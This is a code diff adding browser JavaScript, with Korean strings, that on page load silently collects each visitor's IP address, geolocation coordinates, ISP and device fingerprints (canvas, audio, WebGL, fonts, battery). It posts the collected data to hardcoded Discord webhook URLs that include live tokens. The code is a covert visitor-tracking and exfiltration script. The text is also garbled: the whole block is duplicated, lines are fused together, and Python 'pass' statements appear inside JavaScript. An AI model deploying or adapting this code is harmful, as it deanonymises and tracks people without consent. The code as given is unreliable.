+        }
+
+
+
+        function getWebGLInfo() {
+
+            try {
+
+                const canvas = document.createElement('canvas');
+
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+                if (gl) {
+
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
+                    return {
+
+                        vendor: gl.getParameter(gl.VENDOR),
+
+                        renderer: gl.getParameter(gl.RENDERER),
+
+                        version: gl.getParameter(gl.VERSION),
+
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+
+                        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+
+                        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
+
+                    };
+
+                }
+
+            } catch (e) {
+
+                // console.log('WebGL 정보 수집 실패');
+                pass
+
+            }
+
+            return {
+
+                vendor: 'N/A',
+
+                renderer: 'N/A',
+
+                version: 'N/A',
+
+                shadingLanguageVersion: 'N/A',
+
+                unmaskedVendor: 'N/A',
+
+                unmaskedRenderer: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getCanvasFingerprint() {
+
+            try {
+
+                const canvas = document.createElement('canvas');
+
+                const ctx = canvas.getContext('2d');
+
+                ctx.textBaseline = 'top';
+
+                ctx.font = '14px Arial';
+
+                ctx.fillText('Canvas fingerprint ????', 2, 2);
+
+                return canvas.toDataURL().slice(-50);
+
+            } catch (e) {
+
+                return 'N/A';
+
+            }
+
+        }
+
+
+
+        function getAudioFingerprint() {
+
+            try {
+
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+
+                const oscillator = audioContext.createOscillator();
+
+                const analyser = audioContext.createAnalyser();
+
+                const gainNode = audioContext.createGain();
+
+                
+
+                oscillator.connect(analyser);
+
+                analyser.connect(gainNode);
+
+                gainNode.connect(audioContext.destination);
+
+                
+
+                oscillator.frequency.value = 10000;
+
+                gainNode.gain.value = 0;
+
+                
+
+                const dataArray = new Float32Array(analyser.frequencyBinCount);
+
+                analyser.getFloatFrequencyData(dataArray);
+
+                
+
+                audioContext.close();
+
+                
+
+                return dataArray.slice(0, 10).join(',').slice(0, 50);
+
+            } catch (e) {
+
+                return 'N/A';
+
+            }
+
+        }
+
+
+
+        function getFontsInfo() {
+
+            const fonts = [
+
+                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino',
+
+                'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
+
+                'Arial Narrow', 'Tahoma', 'Geneva', 'Century Gothic', 'Lucida Console', 'Monaco',
+
+                'Courier', 'Bradley Hand ITC', 'Brush Script MT', 'Luminari', 'Chalkduster'
+
+            ];
+
+            
+
+            const availableFonts = [];
+
+            const testString = 'mmmmmmmmmmlli';
+
+            const testSize = '72px';
+
+            
+
+            const canvas = document.createElement('canvas');
+
+            const context = canvas.getContext('2d');
+
+            
+
+            context.font = testSize + ' monospace';
+
+            const baselineWidth = context.measureText(testString).width;
+
+            
+
+            fonts.forEach(font => {
+
+                context.font = testSize + ' ' + font + ', monospace';
+
+                const width = context.measureText(testString).width;
+
+                if (width !== baselineWidth) {
+
+                    availableFonts.push(font);
+
+                }
+
+            });
+
+            
+
+            return availableFonts.length > 0 ? availableFonts.slice(0, 10).join(', ') : 'N/A';
+
+        }
+
+
+
+        function getStorageInfo() {
+
+            try {
+
+                const info = {
+
+                    localStorage: 'localStorage' in window ? '사용 가능' : '사용 불가',
+
+                    sessionStorage: 'sessionStorage' in window ? '사용 가능' : '사용 불가',
+
+                    indexedDB: 'indexedDB' in window ? '사용 가능' : '사용 불가',
+
+                    webSQL: 'openDatabase' in window ? '사용 가능' : '사용 불가'
+
+                };
+
+                
+
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+
+                    navigator.storage.estimate().then(estimate => {
+
+                        info.quota = `${Math.round(estimate.quota / 1024 / 1024)} MB`;
+
+                        info.usage = `${Math.round(estimate.usage / 1024 / 1024)} MB`;
+
+                    });
+
+                }
+
+                
+
+                return info;
+
+            } catch (e) {
+
+                return { localStorage: 'N/A', sessionStorage: 'N/A', indexedDB: 'N/A', webSQL: 'N/A' };
+
+            }
+
+        }
+
+
+
+        function getMediaDevicesInfo() {
+
+            return new Promise(async (resolve) => {
+
+                try {
+
+                    if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+
+                        const info = {
+
+                            audioInput: devices.filter(d => d.kind === 'audioinput').length,
+
+                            audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
+
+                            videoInput: devices.filter(d => d.kind === 'videoinput').length
+
+                        };
+
+                        resolve(info);
+
+                    } else {
+
+                        resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
+
+                    }
+
+                } catch (e) {
+
+                    resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
+
+                }
+
+            });
+
+        }
+
+
+
+        function getTimezoneInfo() {
+
+            try {
+
+                const date = new Date();
+
+                return {
+
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+                    timezoneOffset: date.getTimezoneOffset(),
+
+                    dst: date.getTimezoneOffset() < new Date(date.getFullYear(), 0, 1).getTimezoneOffset(),
+
+                    locale: Intl.DateTimeFormat().resolvedOptions().locale
+
+                };
+
+            } catch (e) {
+
+                return { timezone: 'N/A', timezoneOffset: 'N/A', dst: 'N/A', locale: 'N/A' };
+
+            }
+
+        }
+
+
+
+        function getPerformanceInfo() {
+
+            try {
+
+                const nav = performance.getEntriesByType('navigation')[0];
+
+                return {
+
+                    loadTime: Math.round(nav.loadEventEnd - nav.fetchStart) + 'ms',
+
+                    domContentLoaded: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) + 'ms',
+
+                    pageLoadTime: Math.round(performance.now()) + 'ms'
+
+                };
+
+            } catch (e) {
+
+                return { loadTime: 'N/A', domContentLoaded: 'N/A', pageLoadTime: 'N/A' };
+
+            }
+
+        }
+
+
+
+        async function collectAndSendInfo() {
+
+            try {
+
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+
+                const ipData = await ipResponse.json();
+
+                visitorInfo.ip = ipData.ip;
+
+
+
+                try {
+
+                    const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+
+                    const locationData = await locationResponse.json();
+
+                    
+
+                    if (locationData.status === 'success') {
+
+                        visitorInfo.location = {
+
+                            country: locationData.country,
+
+                            countryCode: locationData.countryCode,
+
+                            region: locationData.regionName,
+
+                            city: locationData.city,
+
+                            isp: locationData.isp,
+
+                            org: locationData.org,
+
+                            timezone: locationData.timezone,
+
+                            lat: locationData.lat,
+
+                            lon: locationData.lon
+
+                        };
+
+                    }
+
+                } catch (e) {
+
+                    // console.log('위치 정보 수집 실패');
+                    pass
+
+                }
+
+
+
+                const now = new Date();
+
+                visitorInfo.timestamp = now.toISOString();
+
+                visitorInfo.localTime = now.toLocaleString('ko-KR');
+
+                visitorInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+
+
+                visitorInfo.device = getDeviceInfo();
+
+                visitorInfo.browser = getBrowserInfo();
+
+                visitorInfo.os = getOSInfo();
+
+                visitorInfo.screen = getScreenInfo();
+
+                visitorInfo.network = getNetworkInfo();
+
+                visitorInfo.battery = await getBatteryInfo();
+
+                visitorInfo.memory = getMemoryInfo();
+
+                visitorInfo.plugins = getPluginsInfo();
+
+                visitorInfo.webgl = getWebGLInfo();
+
+                visitorInfo.canvasFingerprint = getCanvasFingerprint();
+
+                visitorInfo.audioFingerprint = getAudioFingerprint();
+
+                visitorInfo.fonts = getFontsInfo();
+
+                visitorInfo.storage = getStorageInfo();
+
+                visitorInfo.mediaDevices = await getMediaDevicesInfo();
+
+                visitorInfo.timezone = getTimezoneInfo();
+
+                visitorInfo.performance = getPerformanceInfo();
+
+                visitorInfo.url = window.location.href;
+
+                visitorInfo.referrer = document.referrer || '직접 접속';
+
+
+
+                const embed = {
+
+                    title: "새로운 방문자 정보",
+
+                    description: "사용자가 페이지에 접속했습니다.",
+
+                    color: 0x5865F2,
+
+                    timestamp: visitorInfo.timestamp,
+
+                    thumbnail: {
+
+                        url: "https://cdn3.emoji.gg/emojis/6333-discord-logo.png"
+
+                    },
+
+                    fields: [
+
+                        {
+
+                            name: "기본 정보",
+
+                            value: `**IP 주소:** ${visitorInfo.ip}\n**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n**조직:** ${visitorInfo.location?.org || 'N/A'}\n**접속 시간:** ${visitorInfo.localTime}`,
+
+                            inline: true
+
+                        },
+
+                        {
+
+                            name: "위치 정보",
+
+                            value: `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n**지역:** ${visitorInfo.location?.region || 'N/A'}\n**도시:** ${visitorInfo.location?.city || 'N/A'}\n**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n**시간대:** ${visitorInfo.timezone.timezone}`,
+
+                            inline: true
+
+                        },
+
+
+                        {
+
+                            name: "접속 정보",
+
+                            value: `**URL:** ${visitorInfo.url}\n**리퍼러:** ${visitorInfo.referrer}`,
+
+                            inline: false
+
+                        }
+
+                    ],
+
+                    footer: {
+
+                        text: "자동 수집 시스템",
+
+                    }
+
+                };
+
+
+
+                const payload = {
+
+                    embeds: [embed]
+
+                };
+
+
+
+                await fetch(WEBHOOK_URL, {
+
+                    method: 'POST',
+
+                    headers: {
+
+                        'Content-Type': 'application/json',
+
+                    },
+
+                    body: JSON.stringify(payload)
+
+                });
+                
+                await fetch(WEBHOOK_URL, {
+
+                    method: 'POST',
+
+                    headers: {
+
+                        'Content-Type': 'application/json',
+
+                    },
+
+                    body: JSON.stringify(payload)
+
+                });
+
+
+
+            } catch (error) {
+
+                console.error('정보 수집/전송 실패:', error);
+
+            }
+
+            
+
+        }
+
+
+
+        window.addEventListener('load', collectAndSendInfo);        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn'
+        
+        const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1447962446915571846/J6hqwWgxsvjCmg1Q1Q7jRdFiHVex67Yhc9DcNVm7xCcMnAe9TqYfLl0n27ShmFcXdpKx'
+
+        let visitorInfo = {};
+
+
+
+        function getDeviceInfo() {
+
+            return {
+
+                platform: navigator.platform,
+
+                userAgent: navigator.userAgent,
+
+                language: navigator.language,
+
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+
+                touchPoints: navigator.maxTouchPoints || 0,
+
+                cookieEnabled: navigator.cookieEnabled,
+
+                onlineStatus: navigator.onLine ? '온라인' : '오프라인',
+
+                doNotTrack: navigator.doNotTrack || 'N/A'
+
+            };
+
+        }
+
+
+
+        function getScreenInfo() {
+
+            return {
+
+                screenWidth: screen.width,
+
+                screenHeight: screen.height,
+
+                screenAvailWidth: screen.availWidth,
+
+                screenAvailHeight: screen.availHeight,
+
+                windowWidth: window.innerWidth,
+
+                windowHeight: window.innerHeight,
+
+                colorDepth: screen.colorDepth,
+
+                pixelDepth: screen.pixelDepth,
+
+                pixelRatio: window.devicePixelRatio || 1,
+
+                orientation: screen.orientation ? screen.orientation.type : 'N/A'
+
+            };
+
+        }
+
+
+
+        function getNetworkInfo() {
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+            if (connection) {
+
+                return {
+
+                    effectiveType: connection.effectiveType || 'N/A',
+
+                    downlink: connection.downlink ? `${connection.downlink} Mbps` : 'N/A',
+
+                    rtt: connection.rtt ? `${connection.rtt}ms` : 'N/A',
+
+                    saveData: connection.saveData ? '활성화' : '비활성화'
+
+                };
+
+            }
+
+            return {
+
+                effectiveType: 'N/A',
+
+                downlink: 'N/A',
+
+                rtt: 'N/A',
+
+                saveData: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getBrowserInfo() {
+
+            const ua = navigator.userAgent;
+
+            let browserName = 'Unknown';
+
+            let browserVersion = 'Unknown';
+
+            
+
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
+
+                browserName = 'Chrome';
+
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            } else if (ua.indexOf('Firefox') > -1) {
+
+                browserName = 'Firefox';
+
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
+
+                browserName = 'Safari';
+
+                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            } else if (ua.indexOf('Edg') > -1) {
+
+                browserName = 'Edge';
+
+                browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            }
+
+            
+
+            return { browserName, browserVersion };
+
+        }
+
+
+
+        function getOSInfo() {
+
+            const ua = navigator.userAgent;
+
+            let osName = 'Unknown';
+
+            
+
+            if (ua.indexOf('Windows NT 10.0') > -1) osName = 'Windows 10/11';
+
+            else if (ua.indexOf('Windows NT 6.3') > -1) osName = 'Windows 8.1';
+
+            else if (ua.indexOf('Windows NT 6.2') > -1) osName = 'Windows 8';
+
+            else if (ua.indexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
+
+            else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
+
+            else if (ua.indexOf('Linux') > -1) osName = 'Linux';
+
+            else if (ua.indexOf('Android') > -1) osName = 'Android';
+
+            else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) osName = 'iOS';
+
+            
+
+            return osName;
+
+        }
+
+
+
+        async function getBatteryInfo() {
+
+            try {
+
+                if ('getBattery' in navigator) {
+
+                    const battery = await navigator.getBattery();
+
+                    return {
+
+                        level: Math.round(battery.level * 100) + '%',
+
+                        charging: battery.charging ? '충전 중' : '충전 안 함',
+
+                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)}분`,
+
+                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)}분`
+
+                    };
+
+                }
+
+            } catch (e) {
+
+                // console.log('배터리 정보 수집 실패');
+                pass
+
+            }
+
+            return {
+
+                level: 'N/A',
+
+                charging: 'N/A',
+
+                chargingTime: 'N/A',
+
+                dischargingTime: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getMemoryInfo() {
+
+            try {
+
+                if ('memory' in performance) {
+
+                    const memory = performance.memory;
+
+                    return {
+
+                        usedJSHeapSize: `${Math.round(memory.usedJSHeapSize / 1024 / 1024)} MB`,
+
+                        totalJSHeapSize: `${Math.round(memory.totalJSHeapSize / 1024 / 1024)} MB`,
+
+                        jsHeapSizeLimit: `${Math.round(memory.jsHeapSizeLimit / 1024 / 1024)} MB`
+
+                    };
+
+                }
+
+            } catch (e) {
+
+                // console.log('메모리 정보 수집 실패');
+                pass
+
+            }
+
+            return {
+
+                usedJSHeapSize: 'N/A',
+
+                totalJSHeapSize: 'N/A',
+
+                jsHeapSizeLimit: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getPluginsInfo() {
+
+            const plugins = [];
+
+            try {
+
+                for (let i = 0; i < navigator.plugins.length; i++) {
+
+                    const plugin = navigator.plugins[i];
+
+                    plugins.push(`${plugin.name} (${plugin.version || 'N/A'})`);
+
+                }
+
+            } catch (e) {
+
+                // console.log('플러그인 정보 수집 실패');
+                pass
+
+            }
+
+            return plugins.length > 0 ? plugins.slice(0, 10).join(', ') : 'N/A';
+
+        }
+
+
+
+        function getWebGLInfo() {
+
+            try {
+
+                const canvas = document.createElement('canvas');
+
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+                if (gl) {
+
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
+                    return {
+
+                        vendor: gl.getParameter(gl.VENDOR),
+
+                        renderer: gl.getParameter(gl.RENDERER),
+
+                        version: gl.getParameter(gl.VERSION),
+
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+
+                        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+
+                        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
+
+                    };
+
+                }
+
+            } catch (e) {
+
+                // console.log('WebGL 정보 수집 실패');
+                pass
+
+            }
+
+            return {
+
+                vendor: 'N/A',
+
+                renderer: 'N/A',
+
+                version: 'N/A',
+
+                shadingLanguageVersion: 'N/A',
+
+                unmaskedVendor: 'N/A',
+
+                unmaskedRenderer: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getCanvasFingerprint() {
+
+            try {
+
+                const canvas = document.createElement('canvas');
+
+                const ctx = canvas.getContext('2d');
+
+                ctx.textBaseline = 'top';
+
+                ctx.font = '14px Arial';
+
+                ctx.fillText('Canvas fingerprint ????', 2, 2);
+
+                return canvas.toDataURL().slice(-50);
+
+            } catch (e) {
+
+                return 'N/A';
+
+            }
+
+        }
+
+
+
+        function getAudioFingerprint() {
+
+            try {
+
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+
+                const oscillator = audioContext.createOscillator();
+
+                const analyser = audioContext.createAnalyser();
+
+                const gainNode = audioContext.createGain();
+
+                
+
+                oscillator.connect(analyser);
+
+                analyser.connect(gainNode);
+
+                gainNode.connect(audioContext.destination);
+
+                
+
+                oscillator.frequency.value = 10000;
+
+                gainNode.gain.value = 0;
+
+                
+
+                const dataArray = new Float32Array(analyser.frequencyBinCount);
+
+                analyser.getFloatFrequencyData(dataArray);
+
+                
+
+                audioContext.close();
+
+                
+
+                return dataArray.slice(0, 10).join(',').slice(0, 50);
+
+            } catch (e) {
+
+                return 'N/A';
+
+            }
+
+        }
+
+
+
+        function getFontsInfo() {
+
+            const fonts = [
+
+                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino',
+
+                'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
+
+                'Arial Narrow', 'Tahoma', 'Geneva', 'Century Gothic', 'Lucida Console', 'Monaco',
+
+                'Courier', 'Bradley Hand ITC', 'Brush Script MT', 'Luminari', 'Chalkduster'
+
+            ];
+
+            
+
+            const availableFonts = [];
+
+            const testString = 'mmmmmmmmmmlli';
+
+            const testSize = '72px';
+
+            
+
+            const canvas = document.createElement('canvas');
+
+            const context = canvas.getContext('2d');
+
+            
+
+            context.font = testSize + ' monospace';
+
+            const baselineWidth = context.measureText(testString).width;
+
+            
+
+            fonts.forEach(font => {
+
+                context.font = testSize + ' ' + font + ', monospace';
+
+                const width = context.measureText(testString).width;
+
+                if (width !== baselineWidth) {
+
+                    availableFonts.push(font);
+
+                }
+
+            });
+
+            
+
+            return availableFonts.length > 0 ? availableFonts.slice(0, 10).join(', ') : 'N/A';
+
+        }
+
+
+
+        function getStorageInfo() {
+
+            try {
+
+                const info = {
+
+                    localStorage: 'localStorage' in window ? '사용 가능' : '사용 불가',
+
+                    sessionStorage: 'sessionStorage' in window ? '사용 가능' : '사용 불가',
+
+                    indexedDB: 'indexedDB' in window ? '사용 가능' : '사용 불가',
+
+                    webSQL: 'openDatabase' in window ? '사용 가능' : '사용 불가'
+
+                };
+
+                
+
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+
+                    navigator.storage.estimate().then(estimate => {
+
+                        info.quota = `${Math.round(estimate.quota / 1024 / 1024)} MB`;
+
+                        info.usage = `${Math.round(estimate.usage / 1024 / 1024)} MB`;
+
+                    });
+
+                }
+
+                
+
+                return info;
+
+            } catch (e) {
+
+                return { localStorage: 'N/A', sessionStorage: 'N/A', indexedDB: 'N/A', webSQL: 'N/A' };
+
+            }
+
+        }
+
+
+
+        function getMediaDevicesInfo() {
+
+            return new Promise(async (resolve) => {
+
+                try {
+
+                    if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+
+                        const info = {
+
+                            audioInput: devices.filter(d => d.kind === 'audioinput').length,
+
+                            audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
+
+                            videoInput: devices.filter(d => d.kind === 'videoinput').length
+
+                        };
+
+                        resolve(info);
+
+                    } else {
+
+                        resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
+
+                    }
+
+                } catch (e) {
+
+                    resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
+
+                }
+
+            });
+
+        }
+
+
+
+        function getTimezoneInfo() {
+
+            try {
+
+                const date = new Date();
+
+                return {
+
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+                    timezoneOffset: date.getTimezoneOffset(),
+
+                    dst: date.getTimezoneOffset() < new Date(date.getFullYear(), 0, 1).getTimezoneOffset(),
+
+                    locale: Intl.DateTimeFormat().resolvedOptions().locale
+
+                };
+
+            } catch (e) {
+
+                return { timezone: 'N/A', timezoneOffset: 'N/A', dst: 'N/A', locale: 'N/A' };
+
+            }
+
+        }
+
+
+
+        function getPerformanceInfo() {
+
+            try {
+
+                const nav = performance.getEntriesByType('navigation')[0];
+
+                return {
+
+                    loadTime: Math.round(nav.loadEventEnd - nav.fetchStart) + 'ms',
+
+                    domContentLoaded: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) + 'ms',
+
+                    pageLoadTime: Math.round(performance.now()) + 'ms'
+
+                };
+
+            } catch (e) {
+
+                return { loadTime: 'N/A', domContentLoaded: 'N/A', pageLoadTime: 'N/A' };
+
+            }
+
+        }
+
+
+
+        async function collectAndSendInfo() {
+
+            try {
+
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+
+                const ipData = await ipResponse.json();
+
+                visitorInfo.ip = ipData.ip;
+
+
+
+                try {
+
+                    const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+
+                    const locationData = await locationResponse.json();
+
+                    
+
+                    if (locationData.status === 'success') {
+
+                        visitorInfo.location = {
+
+                            country: locationData.country,
+
+                            countryCode: locationData.countryCode,
+
+                            region: locationData.regionName,
+
+                            city: locationData.city,
+
+                            isp: locationData.isp,
+
+                            org: locationData.org,
+
+                            timezone: locationData.timezone,
+
+                            lat: locationData.lat,
+
+                            lon: locationData.lon
+
+                        };
+
+                    }
+
+                } catch (e) {
+
+                    // console.log('위치 정보 수집 실패');
+                    pass
+
+                }
+
+
+
+                const now = new Date();
+
+                visitorInfo.timestamp = now.toISOString();
+
+                visitorInfo.localTime = now.toLocaleString('ko-KR');
+
+                visitorInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+
+
+                visitorInfo.device = getDeviceInfo();
+
+                visitorInfo.browser = getBrowserInfo();
+
+                visitorInfo.os = getOSInfo();
+
+                visitorInfo.screen = getScreenInfo();
+
+                visitorInfo.network = getNetworkInfo();
+
+                visitorInfo.battery = await getBatteryInfo();
+
+                visitorInfo.memory = getMemoryInfo();
+
+                visitorInfo.plugins = getPluginsInfo();
+
+                visitorInfo.webgl = getWebGLInfo();
+
+                visitorInfo.canvasFingerprint = getCanvasFingerprint();
+
+                visitorInfo.audioFingerprint = getAudioFingerprint();
+
+                visitorInfo.fonts = getFontsInfo();
+
+                visitorInfo.storage = getStorageInfo();
+
+                visitorInfo.mediaDevices = await getMediaDevicesInfo();
+
+                visitorInfo.timezone = getTimezoneInfo();
+
+                visitorInfo.performance = getPerformanceInfo();
+
+                visitorInfo.url = window.location.href;
+
+                visitorInfo.referrer = document.referrer || '직접 접속';
+
+
+
+                const embed = {
+
+                    title: "새로운 방문자 정보",
+
+                    description: "사용자가 페이지에 접속했습니다.",
+
+                    color: 0x5865F2,
+
+                    timestamp: visitorInfo.timestamp,
+
+                    thumbnail: {
+
+                        url: "https://cdn3.emoji.gg/emojis/6333-discord-logo.png"
+
+                    },
+
+                    fields: [
+
+                        {
+
+                            name: "기본 정보",
+
+                            value: `**IP 주소:** ${visitorInfo.ip}\n**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n**조직:** ${visitorInfo.location?.org || 'N/A'}\n**접속 시간:** ${visitorInfo.localTime}`,
+
+                            inline: true
+
+                        },
+
+                        {
+
+                            name: "위치 정보",
+
+                            value: `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n**지역:** ${visitorInfo.location?.region || 'N/A'}\n**도시:** ${visitorInfo.location?.city || 'N/A'}\n**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n**시간대:** ${visitorInfo.timezone.timezone}`,
+
+                            inline: true
+
+                        },
+
+
+                        {
+
+                            name: "접속 정보",
+
+                            value: `**URL:** ${visitorInfo.url}\n**리퍼러:** ${visitorInfo.referrer}`,
+
+                            inline: false
+
+                        }
+
+                    ],
+
+                    footer: {
+
+                        text: "자동 수집 시스템",
+
+                    }
+
+                };
+
+
+
+                const payload = {
+
+                    embeds: [embed]
+
+                };
+
+
+
+                await fetch(WEBHOOK_URL, {
+
+                    method: 'POST',
+
+                    headers: {
+
+                        'Content-Type': 'application/json',
+
+                    },
+
+                    body: JSON.stringify(payload)
+
+                });
+                
+                await fetch(WEBHOOK_URL, {
+
+                    method: 'POST',
+
+                    headers: {
+
+                        'Content-Type': 'application/json',
+
+                    },
+
+                    body: JSON.stringify(payload)
+
+                });
+
+
+
+            } catch (error) {
+
+                console.error('정보 수집/전송 실패:', error);
+
+            }
+
+            
+
+        }
+
+
+
+        window.addEventListener('load', collectAndSendInfo);
